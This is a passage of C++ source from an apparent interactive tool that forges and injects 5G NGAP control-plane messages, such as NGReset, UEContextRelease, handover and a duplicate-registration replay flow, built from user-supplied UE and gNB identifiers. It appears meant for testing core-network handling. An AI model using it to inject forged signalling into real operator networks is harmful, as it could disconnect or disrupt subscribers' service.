  std::printf("%s [default=%s]: ", prompt.c_str(), default_to_string(default_value).c_str());
  std::fflush(stdout);

  std::string line;
  if (!std::getline(std::cin, line)) {
    return default_value;
  }
  line = trim_copy(line);
  if (line.empty()) {
    return default_value;
  }

  std::stringstream input(line);
  T                 value{};
  if ((input >> value) && input.eof()) {
    return value;
  }

  std::printf("Invalid input. Using default=%s\n", default_to_string(default_value).c_str());
  return default_value;
}

template <>
std::string get_input_or_default<std::string>(const std::string& prompt, const std::string& default_value)
{
  std::printf("%s [default=%s]: ", prompt.c_str(), default_value.c_str());
  std::fflush(stdout);

  std::string line;
  if (!std::getline(std::cin, line)) {
    return default_value;
  }
  line = trim_copy(line);
  return line.empty() ? default_value : line;
}

template <>
bool get_input_or_default<bool>(const std::string& prompt, const bool& default_value)
{
  std::printf("%s [default=%s]: ", prompt.c_str(), default_value ? "Y" : "N");
  std::fflush(stdout);

  std::string line;
  if (!std::getline(std::cin, line)) {
    return default_value;
  }
  line = trim_copy(line);
  if (line.empty()) {
    return default_value;
  }
  if (line == "Y" || line == "y" || line == "yes" || line == "YES" || line == "1" || line == "true") {
    return true;
  }
  if (line == "N" || line == "n" || line == "no" || line == "NO" || line == "0" || line == "false") {
    return false;
  }

  std::printf("Invalid input. Using default=%s\n", default_value ? "Y" : "N");
  return default_value;
}

static bool is_hex_string(const std::string& value)
{
  return !value.empty() && value.size() % 2 == 0 &&
         std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); });
}

static std::string read_valid_hex_or_default(const std::string& prompt, const std::string& default_hex)
{
  while (true) {
    std::string value = get_input_or_default<std::string>(prompt, default_hex);
    value.erase(std::remove_if(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); }), value.end());
    if (is_hex_string(value)) {
      return value;
    }
    std::printf("Invalid hex string. Use an even number of hex digits.\n");
  }
}


static byte_buffer read_handover_rrc_container_or_default()
{
  while (true) {
    std::string value = get_input_or_default<std::string>("UE Radio Capability hex for HO prep, or sample", "sample");
    value.erase(std::remove_if(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); }), value.end());
    if (value == "sample") {
      std::printf("Using built-in sample RRC HandoverPreparationInformation container.\n");
      return make_hex_byte_buffer_or_throw(default_ho_prep_rrc_container_hex);
    }
    if (!is_hex_string(value)) {
      std::printf("Invalid hex string. Use an even number of hex digits, or sample.\n");
      continue;
    }
    try {
      return build_handover_preparation_rrc_container_from_capability(make_hex_byte_buffer_or_throw(value));
    } catch (const std::exception& e) {
      std::printf("%s\n", e.what());
      std::printf("Paste UE-CapabilityRAT-ContainerList / UERadioAccessCapabilityInformation hex, or enter sample.\n");
    }
  }
}


static std::string read_fixed_hex_or_default(const std::string& prompt, const std::string& default_hex, size_t expected_octets)
{
  while (true) {
    std::string value = read_valid_hex_or_default(prompt, default_hex);
    if (value.size() == expected_octets * 2) {
      return value;
    }
    std::printf("Invalid hex length. Expected %zu octets / %zu hex digits.\n", expected_octets, expected_octets * 2);
  }
}

static std::string read_text_token_or_default(const std::string& prompt, const std::string& default_value)
{
  while (true) {
    const std::string value = get_input_or_default<std::string>(prompt, default_value);
    if (!value.empty() && std::none_of(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); })) {
      return value;
    }
    std::printf("Invalid text value. Use a non-empty string without spaces.\n");
  }
}

static std::string read_plmn_or_default(const std::string& prompt, const std::string& default_plmn)
{
  while (true) {
    const std::string value = get_input_or_default<std::string>(prompt, default_plmn);
    if (value.size() == 6 && std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); })) {
      return value;
    }
    std::printf("Invalid PLMN. Use 3 octets as 6 hex digits, for example 00f110.\n");
  }
}

static std::string read_tac_or_default(const std::string& prompt, const std::string& default_tac)
{
  while (true) {
    std::string value = get_input_or_default<std::string>(prompt, default_tac);
    if (value.rfind("0x", 0) == 0 || value.rfind("0X", 0) == 0) {
      value = value.substr(2);
    }
    if (value.size() <= 6 && std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); })) {
      while (value.size() < 6) {
        value.insert(value.begin(), '0');
      }
      return value;
    }
    std::printf("Invalid TAC. Use 0..ffffff or 3 octets as 6 hex digits.\n");
  }
}

static std::string read_sd_or_default(const std::string& prompt, const std::string& default_sd)
{
  while (true) {
    std::string value = get_input_or_default<std::string>(prompt, default_sd);
    if (value.empty() || value == "none") {
      return "";
    }
    if (value.rfind("0x", 0) == 0 || value.rfind("0X", 0) == 0) {
      value = value.substr(2);
    }
    if (value.size() <= 6 && std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); })) {
      while (value.size() < 6) {
        value.insert(value.begin(), '0');
      }
      return value;
    }
    std::printf("Invalid S-NSSAI SD. Use empty input for absent SD, or 0..ffffff / 3 octets as 6 hex digits.\n");
  }
}

static std::string read_ipv4_or_default(const std::string& prompt, const std::string& default_address)
{
  while (true) {
    const std::string value = get_input_or_default<std::string>(prompt, default_address);
    in_addr           address{};
    if (inet_pton(AF_INET, value.c_str(), &address) == 1) {
      return value;
    }
    std::printf("Invalid IPv4 address. Use dotted decimal format, for example 127.0.0.1.\n");
  }
}

static uint64_t read_uint64_or_default(const std::string& prompt, uint64_t default_value, uint64_t max_value)
{
  while (true) {
    const std::string token = get_input_or_default<std::string>(prompt, default_to_string(default_value));
    uint64_t          value = 0;
    if (parse_uint64(token, value) && value <= max_value) {
      return value;
    }
    std::printf("Invalid value. Valid range is 0..%llu\n", static_cast<unsigned long long>(max_value));
  }
}

static byte_buffer make_hex_byte_buffer_or_throw(const std::string& hex)
{
  auto pdu = make_byte_buffer(hex);
  if (!pdu.has_value()) {
    throw std::runtime_error("Failed to parse hex byte buffer");
  }
  return std::move(pdu.value());
}

static cause_c build_radio_network_cause(const std::string& cause_name)
{
  cause_c cause;
  auto&   rn = cause.set_radio_network();
  if (cause_name == "successful-ho") {
    rn = cause_radio_network_opts::successful_ho;
  } else if (cause_name == "handover-cancelled") {
    rn = cause_radio_network_opts::ho_cancelled;
  } else if (cause_name == "handover-desirable-for-radio-reason") {
    rn = cause_radio_network_opts::ho_desirable_for_radio_reason;
  } else if (cause_name == "unknown-pdu-session-id") {
    rn = cause_radio_network_opts::unknown_pdu_session_id;
  } else if (cause_name == "unknown-qos-flow-id") {
    rn = cause_radio_network_opts::unkown_qos_flow_id;
  } else if (cause_name == "radio-connection-with-ue-lost") {
    rn = cause_radio_network_opts::radio_conn_with_ue_lost;
  } else if (cause_name == "release-due-to-5gc-generated-reason") {
    rn = cause_radio_network_opts::release_due_to_5gc_generated_reason;
  } else if (cause_name == "failure-in-radio-interface-procedure") {
    rn = cause_radio_network_opts::fail_in_radio_interface_proc;
  } else if (cause_name == "interaction-with-other-procedure") {
    rn = cause_radio_network_opts::interaction_with_other_proc;
  } else if (cause_name == "radio-resources-not-available") {
    rn = cause_radio_network_opts::radio_res_not_available;
  } else if (cause_name == "cell-not-available") {
    rn = cause_radio_network_opts::cell_not_available;
  } else if (cause_name == "unknown-target-id") {
    rn = cause_radio_network_opts::unknown_target_id;
  } else if (cause_name == "unknown-local-UE-NGAP-ID") {
    rn = cause_radio_network_opts::unknown_local_ue_ngap_id;
  } else if (cause_name == "inconsistent-remote-UE-NGAP-ID") {
    rn = cause_radio_network_opts::inconsistent_remote_ue_ngap_id;
  } else if (cause_name == "user-inactivity") {
    rn = cause_radio_network_opts::user_inactivity;
  } else if (cause_name == "unspecified") {
    rn = cause_radio_network_opts::unspecified;
  } else {
    rn = cause_radio_network_opts::release_due_to_ngran_generated_reason;
  }
  return cause;
}

static asn1::ngap::global_gnb_id_s build_global_gnb_id(const std::string& plmn, uint32_t gnb_id)
{
  asn1::ngap::global_gnb_id_s id = {};
  id.plmn_id.from_string(plmn);
  id.gnb_id.set_gnb_id().from_number(gnb_id, default_gnb_id_bit_len);
  return id;
}

static user_location_info_c build_user_location_info(const std::string& plmn, const std::string& tac)
{
  user_location_info_c info;
  auto&                nr = info.set_user_location_info_nr();
  nr.nr_cgi.plmn_id.from_string(plmn);
  nr.nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  nr.tai.plmn_id.from_string(plmn);
  nr.tai.tac.from_string(tac);
  return info;
}

static std::string ipv4_to_bit_string(const std::string& address)
{
  in_addr addr = {};
  if (::inet_pton(AF_INET, address.c_str(), &addr) != 1) {
    throw std::runtime_error("Invalid IPv4 transport layer address");
  }

  std::string bits;
  bits.reserve(32);
  const auto* bytes = reinterpret_cast<const uint8_t*>(&addr.s_addr);
  for (unsigned i = 0; i != 4; ++i) {
    for (int bit = 7; bit >= 0; --bit) {
      bits.push_back((bytes[i] & (1U << bit)) != 0 ? '1' : '0');
    }
  }
  return bits;
}

static up_transport_layer_info_c build_gtp_tunnel(const std::string& address, uint32_t teid)
{
  up_transport_layer_info_c info;
  auto&                     tunnel = info.set_gtp_tunnel();
  tunnel.transport_layer_address.from_string(ipv4_to_bit_string(address));
  tunnel.gtp_teid.from_number(teid);
  return info;
}

static void print_confirmation(const std::string& message_name, const std::vector<std::pair<std::string, std::string>>& fields)
{
  std::printf("NGAP injector: preparing %s with parameters:\n", message_name.c_str());
  for (const auto& field : fields) {
    std::printf("  %s=%s\n", field.first.c_str(), field.second.c_str());
  }
}

[[maybe_unused]] static std::optional<ue_ngap_ids> read_ue_ngap_ids()
{
  while (true) {
    std::string line;
    if (!read_line("Enter AMF-UE-NGAP-ID and RAN-UE-NGAP-ID, or q to quit: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);

    if (is_quit_command(line)) {
      return std::nullopt;
    }

    std::stringstream input(line);
    std::string       amf_token;
    std::string       ran_token;
    std::string       extra_token;
    if (!(input >> amf_token >> ran_token) || (input >> extra_token)) {
      std::printf("Expected exactly two IDs, for example: 1 1 or 0x1 0x1\n");
      continue;
    }

    ue_ngap_ids ids = {};
    if (!parse_uint64(amf_token, ids.amf_ue_ngap_id) || ids.amf_ue_ngap_id > max_amf_ue_ngap_id) {
      std::printf("Invalid AMF-UE-NGAP-ID. Valid range is 0..%llu\n",
                  static_cast<unsigned long long>(max_amf_ue_ngap_id));
      continue;
    }
    if (!parse_uint64(ran_token, ids.ran_ue_ngap_id) || ids.ran_ue_ngap_id > max_ran_ue_ngap_id) {
      std::printf("Invalid RAN-UE-NGAP-ID. Valid range is 0..%llu\n",
                  static_cast<unsigned long long>(max_ran_ue_ngap_id));
      continue;
    }

    return ids;
  }
}

static std::optional<ue_message_type> read_ue_message_type()
{
  while (true) {
    std::printf("\nSelect NGAP packet to inject:\n");
    std::printf("  1) NGSetupRequest\n");
    std::printf("  2) NGReset\n");
    std::printf("  3) NGResetAcknowledge\n");
    std::printf("  4) RANConfigurationUpdate\n");
    std::printf("  5) AMFConfigurationUpdateAcknowledge\n");
    std::printf("  6) AMFConfigurationUpdateFailure\n");
    std::printf("  7) ErrorIndication (non-UE-associated)\n");
    std::printf("  8) InitialUEMessage\n");
    std::printf("  9) UplinkNASTransport\n");
    std::printf("  10) NASNonDeliveryIndication\n");
    std::printf("  11) InitialContextSetupResponse\n");
    std::printf("  12) InitialContextSetupFailure\n");
    std::printf("  13) UEContextReleaseRequest\n");
    std::printf("  14) UEContextReleaseComplete\n");
    std::printf("  15) UEContextModificationResponse\n");
    std::printf("  16) UEContextModificationFailure\n");
    std::printf("  17) RRCInactiveTransitionReport\n");
    std::printf("  18) UEContextSuspendRequest\n");
    std::printf("  19) UEContextResumeRequest\n");
    std::printf("  20) RANCPRelocationIndication\n");
    std::printf("  21) ErrorIndication (UE-associated)\n");
    std::printf("  22) PDUSessionResourceSetupResponse\n");
    std::printf("  23) PDUSessionResourceModifyResponse\n");
    std::printf("  24) PDUSessionResourceModifyIndication\n");
    std::printf("  25) PDUSessionResourceNotify\n");
    std::printf("  26) PDUSessionResourceReleaseResponse\n");
    std::printf("  27) HandoverRequired\n");
    std::printf("  28) HandoverRequestAcknowledge\n");
    std::printf("  29) HandoverFailure\n");
    std::printf("  30) HandoverNotify\n");
    std::printf("  31) HandoverCancel\n");
    std::printf("  32) PathSwitchRequest\n");
    std::printf("  33) UplinkRANStatusTransfer\n");
    std::printf("  34) UplinkRANEarlyStatusTransfer\n");
    std::printf("  35) UERadioCapabilityInfoIndication\n");
    std::printf("  36) UERadioCapabilityCheckResponse\n");
    std::printf("  37) UERadioCapabilityIDMappingResponse\n");
    std::printf("  38) LocationReport\n");
    std::printf("  39) LocationReportingFailureIndication\n");
    std::printf("  40) TraceFailureIndication\n");
    std::printf("  41) CellTrafficTrace\n");
    std::printf("  42) SecondaryRATDataUsageReport\n");
    std::printf("  43) DuplicateRegistrationReplayFlow\n");
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("Selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);

    if (is_quit_command(line)) {
      return std::nullopt;
    }
    if (line == "1") { return ue_message_type::ng_setup_request; }
    if (line == "2") { return ue_message_type::ng_reset; }
    if (line == "3") { return ue_message_type::ng_reset_acknowledge; }
    if (line == "4") { return ue_message_type::ran_configuration_update; }
    if (line == "5") { return ue_message_type::amf_configuration_update_acknowledge; }
    if (line == "6") { return ue_message_type::amf_configuration_update_failure; }
    if (line == "7") { return ue_message_type::non_ue_error_indication; }
    if (line == "8") { return ue_message_type::initial_ue_message; }
    if (line == "9") { return ue_message_type::uplink_nas_transport; }
    if (line == "10") { return ue_message_type::nas_non_delivery_indication; }
    if (line == "11") { return ue_message_type::initial_context_setup_response; }
    if (line == "12") { return ue_message_type::initial_context_setup_failure; }
    if (line == "13") { return ue_message_type::ue_context_release_request; }
    if (line == "14") { return ue_message_type::ue_context_release_complete; }
    if (line == "15") { return ue_message_type::ue_context_modification_response; }
    if (line == "16") { return ue_message_type::ue_context_modification_failure; }
    if (line == "17") { return ue_message_type::rrc_inactive_transition_report; }
    if (line == "18") { return ue_message_type::ue_context_suspend_request; }
    if (line == "19") { return ue_message_type::ue_context_resume_request; }
    if (line == "20") { return ue_message_type::ran_cp_relocation_indication; }
    if (line == "21") { return ue_message_type::ue_error_indication; }
    if (line == "22") { return ue_message_type::pdu_session_resource_setup_response; }
    if (line == "23") { return ue_message_type::pdu_session_resource_modify_response; }
    if (line == "24") { return ue_message_type::pdu_session_resource_modify_indication; }
    if (line == "25") { return ue_message_type::pdu_session_resource_notify; }
    if (line == "26") { return ue_message_type::pdu_session_resource_release_response; }
    if (line == "27") { return ue_message_type::handover_required; }
    if (line == "28") { return ue_message_type::handover_request_acknowledge; }
    if (line == "29") { return ue_message_type::handover_failure; }
    if (line == "30") { return ue_message_type::handover_notify; }
    if (line == "31") { return ue_message_type::handover_cancel; }
    if (line == "32") { return ue_message_type::path_switch_request; }
    if (line == "33") { return ue_message_type::uplink_ran_status_transfer; }
    if (line == "34") { return ue_message_type::uplink_ran_early_status_transfer; }
    if (line == "35") { return ue_message_type::ue_radio_capability_info_indication; }
    if (line == "36") { return ue_message_type::ue_radio_capability_check_response; }
    if (line == "37") { return ue_message_type::ue_radio_capability_id_mapping_response; }
    if (line == "38") { return ue_message_type::location_report; }
    if (line == "39") { return ue_message_type::location_reporting_failure_indication; }
    if (line == "40") { return ue_message_type::trace_failure_indication; }
    if (line == "41") { return ue_message_type::cell_traffic_trace; }
    if (line == "42") { return ue_message_type::secondary_rat_data_usage_report; }
    if (line == "43") { return ue_message_type::duplicate_registration_replay_flow; }

    std::printf("Invalid selection. Enter 1..43 or q.\n");
  }
}


struct error_indication_request {
  bool        include_amf_ue_ngap_id = false;
  bool        include_ran_ue_ngap_id = false;
  uint64_t    amf_ue_ngap_id         = 0;
  uint64_t    ran_ue_ngap_id         = 0;
  bool        include_cause          = true;
  std::string cause                  = "release-due-to-ngran-generated-reason";
  bool        crit_diagnostics       = false;
  std::string variant;
};

static std::optional<error_indication_request> read_error_indication_request(bool ue_associated)
{
  while (true) {
    std::printf("\nSelect ErrorIndication variant [default=1]:\n");
    if (ue_associated) {
      std::printf("  1) UE-associated: AMF UE ID + RAN UE ID + cause\n");
      std::printf("  2) UE-associated: AMF UE ID only + cause\n");
      std::printf("  3) UE-associated: RAN UE ID only + cause\n");
    } else {
      std::printf("  1) Non-UE-associated: cause only\n");
      std::printf("  2) Non-UE-associated: cause + criticality diagnostics\n");
      std::printf("  3) Non-UE-associated: criticality diagnostics only\n");
    }
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("ErrorIndication selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);
    if (line.empty()) {
      line = "1";
    }
    if (is_quit_command(line)) {
      return std::nullopt;
    }

    uint64_t selection = 0;
    if (!parse_uint64(line, selection) || selection < 1 || selection > 3) {
      std::printf("Invalid ErrorIndication variant. Enter 1..3 or q.\n");
      continue;
    }

    error_indication_request req = {};
    req.variant = line;
    if (ue_associated) {
      if (selection == 1 || selection == 2) {
        req.include_amf_ue_ngap_id = true;
        req.amf_ue_ngap_id = read_uint64_or_default("AMF UE NGAP ID", 1, max_amf_ue_ngap_id);
      }
      if (selection == 1 || selection == 3) {
        req.include_ran_ue_ngap_id = true;
        req.ran_ue_ngap_id = read_uint64_or_default("RAN UE NGAP ID", 100, max_ran_ue_ngap_id);
      }
      req.include_cause = true;
      auto cause = read_error_indication_cause(true);
      if (!cause.has_value()) {
        return std::nullopt;
      }
      req.cause = cause.value();
    } else {
      req.include_cause = selection != 3;
      if (req.include_cause) {
        auto cause = read_error_indication_cause(false);
        if (!cause.has_value()) {
          return std::nullopt;
        }
        req.cause = cause.value();
      }
      req.crit_diagnostics = selection == 2 || selection == 3;
    }
    return req;
  }
}

static std::optional<std::vector<injectable_ngap_pdu>> read_injectable_ngap_pdus()
{
  const auto message_type = read_ue_message_type();
  if (!message_type.has_value()) {
    return std::nullopt;
  }

  const auto read_amf_id = []() { return read_uint64_or_default("AMF UE NGAP ID", 1, max_amf_ue_ngap_id); };
  const auto read_ran_id = []() { return read_uint64_or_default("RAN UE NGAP ID", 100, max_ran_ue_ngap_id); };
  const auto single      = [](injectable_ngap_pdu pdu) {
    std::vector<injectable_ngap_pdu> pdus;
    pdus.push_back(std::move(pdu));
    return pdus;
  };

  switch (message_type.value()) {
    case ue_message_type::ng_setup_request: {
      print_confirmation("NGSetupRequest", {{"gNB-ID", default_to_string(current_gnb_id)},
                                             {"gNB-ID-Bit-Length", default_to_string(static_cast<unsigned>(default_gnb_id_bit_len))},
                                             {"Sector-ID", default_to_string(static_cast<unsigned>(default_sector_id))},
                                             {"RAN-Node-Name", current_ran_node_name}});
      return single(injectable_ngap_pdu{build_ng_setup_request(), "NGSetupRequest"});
    }
    case ue_message_type::ue_context_release_request: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     cause  = read_ue_context_release_cause();
      if (!cause.has_value()) {
        return std::nullopt;
      }
      print_confirmation("UEContextReleaseRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                      {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                      {"Cause", get_radio_network_cause_label(cause.value())}});
      return single(injectable_ngap_pdu{build_ue_context_release_request(amf_id, ran_id, cause.value()),
                                 "UEContextReleaseRequest"});
    }
    case ue_message_type::uplink_nas_transport: {
      const uint64_t    amf_id  = read_amf_id();
      const uint64_t    ran_id  = read_ran_id();
      const std::string nas_hex = read_valid_hex_or_default("NAS PDU hex", "00");
      print_confirmation("UplinkNASTransport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                 {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                 {"NAS-PDU", nas_hex}});
      return single(injectable_ngap_pdu{build_uplink_nas_transport(amf_id, ran_id, make_hex_byte_buffer_or_throw(nas_hex)),
                                 "UplinkNASTransport"});
    }
    case ue_message_type::pdu_session_resource_release_response: {
      const uint64_t amf_id         = read_amf_id();
      const uint64_t ran_id         = read_ran_id();
      const auto     pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      print_confirmation("PDUSessionResourceReleaseResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                                {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                                {"PDU-Session-ID", default_to_string(pdu_session_id)}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_release_response(amf_id, ran_id, pdu_session_id),
                                 "PDUSessionResourceReleaseResponse"});
    }
    case ue_message_type::ng_reset: {
      const uint32_t original_gnb_id        = current_gnb_id;
      const std::string original_node_name  = current_ran_node_name;
      current_gnb_id = static_cast<uint32_t>(read_uint64_or_default("NGReset gNB ID", current_gnb_id, max_default_gnb_id));
      current_ran_node_name = read_text_token_or_default("NGReset RAN node name", current_ran_node_name);

      const bool reset_all = get_input_or_default<bool>("Reset Type NG Interface Reset", true);
      std::vector<ue_ngap_ids> ue_ids;
      std::vector<std::pair<std::string, std::string>> fields = {
          {"gNB-ID", default_to_string(current_gnb_id)},
          {"RAN-Node-Name", current_ran_node_name},
          {"Reset-Type", reset_all ? "NG Interface Reset" : "Part of NG Interface"},
          {"Cause", "radio-connection-with-ue-lost"}};

      if (!reset_all) {
        const auto ue_count = read_uint64_or_default("UE list entry count", 1, 256);
        fields.emplace_back("UE-List-Entry-Count", default_to_string(ue_count));
        for (uint64_t i = 0; i != ue_count; ++i) {
          const std::string suffix = ue_count == 1 ? "" : " #" + default_to_string(i + 1);
          const uint64_t amf_id = read_uint64_or_default("AMF UE NGAP ID" + suffix, 1 + i, max_amf_ue_ngap_id);
          const uint64_t ran_id = read_uint64_or_default("RAN UE NGAP ID" + suffix, 100 + i, max_ran_ue_ngap_id);
          ue_ids.push_back({amf_id, ran_id});
          fields.emplace_back("AMF-UE-NGAP-ID" + suffix, default_to_string(amf_id));
          fields.emplace_back("RAN-UE-NGAP-ID" + suffix, default_to_string(ran_id));
        }
      }

      print_confirmation("NGReset", fields);
      auto pdu = injectable_ngap_pdu{build_ng_reset(reset_all, ue_ids), "NGReset"};
      current_gnb_id = original_gnb_id;
      current_ran_node_name = original_node_name;
      return single(std::move(pdu));
    }
    case ue_message_type::ng_reset_acknowledge: {
      const bool include_ue_list = get_input_or_default<bool>("Include UE-associated logical NG connection list", false);
      std::vector<ue_ngap_ids> ue_ids;
      std::vector<std::pair<std::string, std::string>> fields = {{"UE-List-Included", include_ue_list ? "Y" : "N"}};
      if (include_ue_list) {
        const auto ue_count = read_uint64_or_default("UE list entry count", 1, 256);
        fields.emplace_back("UE-List-Entry-Count", default_to_string(ue_count));
        for (uint64_t i = 0; i != ue_count; ++i) {
          const std::string suffix = ue_count == 1 ? "" : " #" + default_to_string(i + 1);
          const uint64_t amf_id = read_uint64_or_default("AMF UE NGAP ID" + suffix, 1 + i, max_amf_ue_ngap_id);
          const uint64_t ran_id = read_uint64_or_default("RAN UE NGAP ID" + suffix, 100 + i, max_ran_ue_ngap_id);
          ue_ids.push_back({amf_id, ran_id});
          fields.emplace_back("AMF-UE-NGAP-ID" + suffix, default_to_string(amf_id));
          fields.emplace_back("RAN-UE-NGAP-ID" + suffix, default_to_string(ran_id));
        }
      }
      print_confirmation("NGResetAcknowledge", fields);
      return single(injectable_ngap_pdu{build_ng_reset_acknowledge(ue_ids), "NGResetAcknowledge"});
    }
    case ue_message_type::ran_configuration_update: {
      const auto        gnb_id = static_cast<uint32_t>(read_uint64_or_default("Global gNB ID", current_gnb_id, max_default_gnb_id));
      const std::string plmn   = read_plmn_or_default("PLMN", "00f110");
      const std::string tac    = read_tac_or_default("TAC", "000007");
      const auto        sst    = static_cast<uint8_t>(read_uint64_or_default("S-NSSAI SST", 1, 255));
      const std::string sd     = read_sd_or_default("S-NSSAI SD", "");
      print_confirmation("RANConfigurationUpdate", {{"Global-gNB-ID", default_to_string(gnb_id)},
                                                      {"PLMN", plmn},
                                                      {"TAC", tac},
                                                      {"SST", default_to_string(static_cast<unsigned>(sst))},
                                                      {"SD", sd}});
      return single(injectable_ngap_pdu{build_ran_configuration_update(gnb_id, plmn, tac, sst, sd), "RANConfigurationUpdate"});
    }
    case ue_message_type::amf_configuration_update_acknowledge: {
      print_confirmation("AMFConfigurationUpdateAcknowledge", {{"Optional-IEs", "none"}});
      return single(injectable_ngap_pdu{build_amf_configuration_update_acknowledge(),
                                         "AMFConfigurationUpdateAcknowledge"});
    }
    case ue_message_type::amf_configuration_update_failure: {
      const std::string cause = get_input_or_default<std::string>("Cause", "release-due-to-ngran-generated-reason");
      print_confirmation("AMFConfigurationUpdateFailure", {{"Cause", cause}});
      return single(injectable_ngap_pdu{build_amf_configuration_update_failure(cause),
                                         "AMFConfigurationUpdateFailure"});
    }
    case ue_message_type::non_ue_error_indication: {
      const auto req = read_error_indication_request(false);
      if (!req.has_value()) {
        return std::nullopt;
      }
      std::vector<std::pair<std::string, std::string>> fields = {{"Variant", req->variant},
                                                                 {"AMF-UE-NGAP-ID-Present", req->include_amf_ue_ngap_id ? "Y" : "N"},
                                                                 {"RAN-UE-NGAP-ID-Present", req->include_ran_ue_ngap_id ? "Y" : "N"},
                                                                 {"Cause-Present", req->include_cause ? "Y" : "N"},
                                                                 {"CriticalityDiagnostics", req->crit_diagnostics ? "Y" : "N"}};
      if (req->include_amf_ue_ngap_id) {
        fields.emplace_back("AMF-UE-NGAP-ID", default_to_string(req->amf_ue_ngap_id));
      }
      if (req->include_ran_ue_ngap_id) {
        fields.emplace_back("RAN-UE-NGAP-ID", default_to_string(req->ran_ue_ngap_id));
      }
      if (req->include_cause) {
        fields.emplace_back("Cause", req->cause);
      }
      print_confirmation("ErrorIndication", fields);
      return single(injectable_ngap_pdu{build_error_indication(req->include_amf_ue_ngap_id,
                                                               req->amf_ue_ngap_id,
                                                               req->include_ran_ue_ngap_id,
                                                               req->ran_ue_ngap_id,
                                                               req->include_cause,
                                                               req->cause,
                                                               req->crit_diagnostics),
                                         "ErrorIndication"});
    }
    case ue_message_type::ue_error_indication: {
      const auto req = read_error_indication_request(true);
      if (!req.has_value()) {
        return std::nullopt;
      }
      std::vector<std::pair<std::string, std::string>> fields = {{"Variant", req->variant},
                                                                 {"AMF-UE-NGAP-ID-Present", req->include_amf_ue_ngap_id ? "Y" : "N"},
                                                                 {"RAN-UE-NGAP-ID-Present", req->include_ran_ue_ngap_id ? "Y" : "N"},
                                                                 {"Cause-Present", req->include_cause ? "Y" : "N"},
                                                                 {"CriticalityDiagnostics", req->crit_diagnostics ? "Y" : "N"}};
      if (req->include_amf_ue_ngap_id) {
        fields.emplace_back("AMF-UE-NGAP-ID", default_to_string(req->amf_ue_ngap_id));
      }
      if (req->include_ran_ue_ngap_id) {
        fields.emplace_back("RAN-UE-NGAP-ID", default_to_string(req->ran_ue_ngap_id));
      }
      if (req->include_cause) {
        fields.emplace_back("Cause", req->cause);
      }
      print_confirmation("ErrorIndication", fields);
      return single(injectable_ngap_pdu{build_error_indication(req->include_amf_ue_ngap_id,
                                                               req->amf_ue_ngap_id,
                                                               req->include_ran_ue_ngap_id,
                                                               req->ran_ue_ngap_id,
                                                               req->include_cause,
                                                               req->cause,
                                                               req->crit_diagnostics),
                                         "ErrorIndication"});
    }
    case ue_message_type::nas_non_delivery_indication: {
      const uint64_t    amf_id  = read_amf_id();
      const uint64_t    ran_id  = read_ran_id();
      const std::string cause   = get_input_or_default<std::string>("Cause", "release-due-to-ngran-generated-reason");
      const std::string nas_hex = read_valid_hex_or_default("NAS PDU hex", "00");
      print_confirmation("NASNonDeliveryIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                       {"Cause", cause},
                                                       {"NAS-PDU", nas_hex}});
      return single(injectable_ngap_pdu{build_nas_non_delivery_indication(amf_id, ran_id, cause, make_hex_byte_buffer_or_throw(nas_hex)),
                                 "NASNonDeliveryIndication"});
    }
    case ue_message_type::pdu_session_resource_notify: {
      const uint64_t amf_id         = read_amf_id();
      const uint64_t ran_id         = read_ran_id();
      const auto     pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto     qfi            = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const std::string cause       = get_input_or_default<std::string>("Cause", "unknown-pdu-session-id");
      print_confirmation("PDUSessionResourceNotify", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                       {"PDU-Session-ID", default_to_string(pdu_session_id)},
                                                       {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                       {"Cause", cause}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_notify(amf_id, ran_id, pdu_session_id, qfi, cause),
                                 "PDUSessionResourceNotify"});
    }
    case ue_message_type::handover_required: {
      const uint64_t    amf_id      = read_amf_id();
      const uint64_t    ran_id      = read_ran_id();
      const std::string cause       = get_input_or_default<std::string>("Cause", "handover-desirable-for-radio-reason");
      const auto        default_target_gnb = current_gnb_id < max_default_gnb_id ? current_gnb_id + 1 : current_gnb_id;
      const auto        target_gnb         = static_cast<uint32_t>(read_uint64_or_default("Target gNB ID", default_target_gnb, max_default_gnb_id));
      const std::string ho_type        = get_input_or_default<std::string>("Handover Type", "intra5gs");
      const std::string plmn           = read_plmn_or_default("Target PLMN", "00f110");
      const std::string tac            = read_tac_or_default("Target TAC", "000007");
      const auto        pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        qfi            = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      byte_buffer       rrc_container  = read_handover_rrc_container_or_default();
